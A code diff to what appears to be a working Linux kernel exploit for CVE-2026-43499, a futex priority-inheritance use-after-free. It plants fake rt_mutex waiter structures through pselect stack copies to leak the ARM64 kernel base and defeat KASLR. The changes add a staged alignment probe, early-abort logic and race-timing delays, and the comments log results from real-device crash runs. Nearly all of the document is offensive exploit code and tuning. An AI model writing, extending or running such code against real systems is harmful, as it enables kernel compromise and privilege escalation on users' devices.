@@ -25,7 +25,16 @@
 #define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
 #define SLIDE_PSELECT_PAD_BYTES 0
 #define SLIDE_PSELECT_WORD_SHIFT_BASE 0
-#define SLIDE_WAIT_SECONDS 10
+#define SLIDE_WAIT_SECONDS 3
+
+/* DEPTH 0: ghost waiter prio 种 120(=DEFAULT_PRIO, CFS task 的 __waiter_prio
+ * 恒为 120) -> rt_mutex_adjust_pi 的 rt_mutex_waiter_equal() 命中 ->
+ * 零解引用早退。跑通即证明 shift 对齐(prio 字段读到我们种的值)且
+ * UAF+walk 入口打通;崩了说明 shift 错(prio 读垃圾->走 walk->lock 解引用炸)。
+ * DEPTH 2: prio=130(现状) 全链真跑(dequeue/enqueue/wake 链)。 */
+#define SLIDE_DEPTH_EARLY_EXIT 0
+#define SLIDE_DEPTH_FULL_CHAIN 2
+#define SLIDE_CFS_WAITER_PRIO 120
 
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
@@ -41,7 +50,10 @@ static atomic_int slide_consume_go;
 static atomic_int slide_consume_stop;
 static atomic_int slide_consume_sched_ok;
 static atomic_int slide_consume_calls;
-static atomic_int slide_probe_mode;
+static atomic_int slide_abort_attempt;
+static int slide_probe_depth = SLIDE_DEPTH_FULL_CHAIN;
+static atomic_int slide_child_edeadlk;
+static int slide_shift_verified = -100;
 
 static int slide_word_shift;
 
@@ -230,6 +242,10 @@ static void prepare_slide_pselect_fdsets_shifted(
    * w9=deadline w10=ww_ctx
    * shift=3 maps w0→global3(0x18), w8→global11(0x58), w10→global13(0x68)
    * All within 3 sets × 5 words = 15 slots (global 0-14). */
+  uint64_t waiter_prio_word = ((uint64_t)FAKE_WAITER_PRIO << 32) | 3;
+  if (slide_probe_depth == SLIDE_DEPTH_EARLY_EXIT) {
+    waiter_prio_word = ((uint64_t)SLIDE_CFS_WAITER_PRIO << 32) | 3;
+  }
   struct slide_waiter_word {
     int word;
     uint64_t value;
@@ -251,7 +267,7 @@ static void prepare_slide_pselect_fdsets_shifted(
     {5, 0, "pi_left"},
     {6, fake_task, "task"},
     {7, fake_lock, "lock"},
-    {8, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_state_prio"},
+    {8, waiter_prio_word, "wake_state_prio"},
     {9, 0, "deadline"},
     {10, 0, "ww_ctx"},
   };
@@ -343,9 +359,9 @@ void slide_pselect_stack_copy(void) {
   int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
   atomic_store(&slide_consume_go, 0);
-  pr_info("slide pselect RETURNED ret=%d errno=%d shift=%d probe=%d sched_ok=%d calls=%d\n",
+  pr_info("slide pselect RETURNED ret=%d errno=%d shift=%d depth=%d sched_ok=%d calls=%d\n",
           ret, saved_errno, slide_word_shift,
-          atomic_load(&slide_probe_mode),
+          slide_probe_depth,
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_calls));
   pr_info("slide pselect comparing fd_sets vs planted payload "
@@ -399,19 +415,8 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     int tid = atomic_load(&slide_waiter_tid);
     int calls = atomic_load(&slide_consume_calls);
     atomic_store(&slide_consume_calls, calls + 1);
-    if (atomic_load(&slide_probe_mode)) {
-      pr_info("slide consumer PROBE round call#%d tid=%d: skipping sched_setattr "
-              "(safe probe; pselect must return without PI chain walk)\n",
-              calls + 1, tid);
-      fflush(stdout);
-      atomic_store(&slide_consume_stop, 1);
-      while (atomic_load(&slide_consume_go)) {
-        __asm__ volatile("yield" ::: "memory");
-      }
-      return NULL;
-    }
-    pr_info("slide consumer call#%d tid=%d stage=RT-ENTER sched_setattr SCHED_FIFO prio=50\n",
-            calls + 1, tid);
+    pr_info("slide consumer call#%d tid=%d depth=%d stage=RT-ENTER sched_setattr SCHED_FIFO prio=50\n",
+            calls + 1, tid, slide_probe_depth);
     fflush(stdout);
     errno = 0;
     long ret = sched_setattr_tid_rt(tid, 50);
@@ -492,6 +497,15 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   long wr = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                      &slide_f_pi_target, 0);
   pr_info("slide waiter after FUTEX_WAIT_REQUEUE_PI ret=%ld errno=%d\n", wr, errno);
+  if (atomic_load(&slide_abort_attempt)) {
+    /* requeue 没触发 EDEADLK(纯时序竞争): 本轮没有 UAF, 走完 pselect 也
+     * 拿不到泄漏 —— 直接收工, 省掉 5 秒 pselect, 让父进程立刻开下一轮。 */
+    pr_info("slide waiter aborting attempt (no EDEADLK armed), skip pselect\n");
+    atomic_store(&slide_route_done, 1);
+    for (;;) {
+      sleep(1);
+    }
+  }
   /* CVE-2026-43499 choreography: keep pi_chain held across pselect.
    * Unlocking wakes the owner, which then races the fake rbtree walk -> panic. */
   pr_info("slide waiter holding pi_chain across pselect\n");
@@ -687,6 +701,11 @@ uint64_t slide_child_leak_stext(void) {
   if (!blocked) {
     usleep(50000);
   }
+  /* wchan=futex 只说明 owner 睡下了, 它在 pi_chain 上的 PI 依赖
+   * (owner->pi_blocked_on 指向 chain 的 waiter) 还需要一点时间建立。
+   * 立刻 requeue 会撞上空窗 -> requeue 返回 0(无 EDEADLK, 见 run2 attempt2)。
+   * 等 20ms 让环完全闭合再发。 */
+  usleep(20000);
 
   pr_info("slide child conditions met, issuing FUTEX_CMP_REQUEUE_PI\n");
 
@@ -697,7 +716,17 @@ uint64_t slide_child_leak_stext(void) {
           req, errno);
   if (req >= 0) {
     pr_warning("slide requeue returned success (no EDEADLK): PI cycle was not armed, write primitive will NOT fire this attempt\n");
+    /* 快速收工: 叫醒 waiter 走 abort 分支, 不再浪费 5 秒 pselect。 */
+    atomic_store(&slide_abort_attempt, 1);
+    usleep(100000);
+    pthread_kill(waiter, SIGALRM);
+    while (!atomic_load(&slide_route_done)) {
+      sleep(1);
+    }
+    pr_info("slide child aborted attempt (no EDEADLK)\n");
+    return 0;
   }
+  atomic_store(&slide_child_edeadlk, 1);
 
   usleep(50000);
   pthread_kill(waiter, SIGALRM);
@@ -725,9 +754,17 @@ uint64_t slide_child_leak_stext(void) {
 
 /* 【第 1 关总入口】多次尝试(最多 40 轮)，每轮：
  *   - 轮换 shift(纸条和栈的对齐偏差，编译器布局决定，需试出来)
- *   - 第 1 轮是"彩排"(probe)：consumer 不喊老师，验证 pselect 本身不崩
+ *   - 两段验证序列：同一 shift 先跑 DEPTH 0(prio=120 早退,零解引用)验证
+ *     对齐,不崩才升级 DEPTH 2(全链真跑)。DEPTH 0 崩 = shift 错
+ *     (prio 读垃圾 -> walk -> lock 解引用炸),设备重启换 SLIDE_SHIFT 再来。
  *   - 每轮新备一个魔法书包(内核页)，演砸了(child 崩)也只损失一轮
  * 闯关成功判据：子进程从管道送回非零 _stext 门牌号。 */
+struct slide_child_result {
+  uint64_t stext;
+  uint32_t edeadlk_ok;
+  uint32_t depth;
+};
+
 int slide_leak_kernel_base(void) {
   /* shift = (futex waiter stack offset - pselect fd_set word0 offset) / 8.
    * Compiler/layout dependent: override with SLIDE_SHIFT env to probe.
@@ -741,26 +778,27 @@ int slide_leak_kernel_base(void) {
   /* 单 shift 单跑(防连环重启):
    * - shift=0 已实测 NICE-ENTER panic:假标签错位,pi_blocked_on 残留处
    *   读到 fd_set 垃圾字段(prio 0x8200000003 等)当指针用。
-   * - shift=3 是真机验证值,但修复(rbtree 染色)后的真跑从未执行:
-   *   每次运行 attempt1=PROBE 彩排, attempt2 才真跑 —— 崩了设备重启,
-   *   下一个 shift 永远轮不到,所以这里只留 shift=3。
-   * - 换 shift 用 SLIDE_SHIFT=n 环境变量单点验证。 */
+   * - shift=3 是真机验证值。DEPTH 0 探测失败(重启)则换 SLIDE_SHIFT=n 单点验证。
+   * - run2 attempt3 现象: prio=130 永不匹配 __waiter_prio(CFS)=120 的早退
+   *   条件,walk 必然走到 lock 解引用 —— 崩=对齐错,早退=对齐对。 */
   int shifts[] = {3};
   int n_shifts = sizeof(shifts) / sizeof(shifts[0]);
-
-  /* attempt 1 = safe probe: consumer never calls sched_setattr, so the PI
-   * chain walk never runs. If pselect still panics there, the waiter overlap
-   * itself (fd_set copy-in) is the killer, not the PI walk. */
-  int probe_first = (fixed_shift == -100);
 
   for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
     slide_word_shift = (fixed_shift != -100)
                            ? fixed_shift
                            : shifts[(attempt - 1) % n_shifts];
-    atomic_store(&slide_probe_mode, probe_first && attempt == 1);
-    if (atomic_load(&slide_probe_mode)) {
-      pr_info("slide attempt 1 PROBE MODE: sched_setattr disabled, expect clean pselect return + fd_set write-back dump\n");
-    }
+    /* 同一 shift: 先 DEPTH 0 早退验证, 通过后(slide_shift_verified)才全链。 */
+    slide_probe_depth = (slide_word_shift == slide_shift_verified)
+                            ? SLIDE_DEPTH_FULL_CHAIN
+                            : SLIDE_DEPTH_EARLY_EXIT;
+    pr_info("slide attempt %d depth=%d (%s) shift=%d%s\n", attempt,
+            slide_probe_depth,
+            slide_probe_depth == SLIDE_DEPTH_EARLY_EXIT
+                ? "prio=120 early-exit: walk reads ghost prio then returns, zero deref"
+                : "full chain: dequeue/enqueue/wake over fake graph",
+            slide_word_shift,
+            slide_word_shift == slide_shift_verified ? " (depth0 verified)" : "");
 
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
@@ -784,7 +822,12 @@ int slide_leak_kernel_base(void) {
       disable_rseq_for_thread();
       log_slide_child_context();
       uint64_t stext = slide_child_leak_stext();
-      SYSCHK(write(fds[1], &stext, sizeof(stext)));
+      struct slide_child_result res = {
+          .stext = stext,
+          .edeadlk_ok = (uint32_t)atomic_load(&slide_child_edeadlk),
+          .depth = (uint32_t)slide_probe_depth,
+      };
+      SYSCHK(write(fds[1], &res, sizeof(res)));
       /* Park instead of _exit: exit_group kills the waiter thread, and the
        * kernel exit path auto-releases its held PI futex -> another PI chain
        * walk over the fake waiter (confirmed panic path on shennong). */
@@ -796,12 +839,24 @@ int slide_leak_kernel_base(void) {
     }
 
     SYSCHK(close(fds[1]));
-    uint64_t stext = 0;
-    ssize_t n = read(fds[0], &stext, sizeof(stext));
+    struct slide_child_result res = {0, 0, 0};
+    ssize_t n = read(fds[0], &res, sizeof(res));
     SYSCHK(close(fds[0]));
     /* no waitpid: child parks with live waiter/owner threads */
 
-    if (n == (ssize_t)sizeof(stext) && stext) {
+    if (n == (ssize_t)sizeof(res) && res.edeadlk_ok &&
+        res.depth == SLIDE_DEPTH_EARLY_EXIT && !res.stext &&
+        slide_word_shift != slide_shift_verified) {
+      /* DEPTH 0 完整跑完且没崩(能写回管道就是没崩):
+       * ghost waiter 的 prio 字段读到 120 -> shift 对齐正确。 */
+      slide_shift_verified = slide_word_shift;
+      pr_success("slide depth0-ok pid=%d shift=%d: prio-match early-exit "
+                 "survived, alignment confirmed, next attempt runs full chain\n",
+                 getpid(), slide_word_shift);
+    }
+
+    if (n == (ssize_t)sizeof(res) && res.stext) {
+      uint64_t stext = res.stext;
       /* 二次校验:ARM64 KASLR slide 必须 2MB 对齐且落在 1GB 内 */
       if ((stext & 0x1fffffULL) != 0 ||
           stext - KIMAGE_TEXT_BASE >= 0x40000000ULL) {
@@ -812,14 +867,16 @@ int slide_leak_kernel_base(void) {
       kaslr_base = stext;
       kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
       kaslr_done = 1;
-      pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx shift=%d\n",
+      pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx shift=%d depth=%d\n",
                  getpid(), (unsigned long long)kaslr_base,
-                 (unsigned long long)kaslr_slide, slide_word_shift);
+                 (unsigned long long)kaslr_slide, slide_word_shift,
+                 slide_probe_depth);
       return 1;
     }
 
-    pr_warning("slide attempt %d failed n=%zd stext=%016llx shift=%d\n",
-               attempt, n, (unsigned long long)stext, slide_word_shift);
+    pr_warning("slide attempt %d failed n=%zd stext=%016llx edeadlk=%u shift=%d depth=%d\n",
+               attempt, n, (unsigned long long)res.stext, res.edeadlk_ok,
+               slide_word_shift, slide_probe_depth);
   }
 
   return 0;
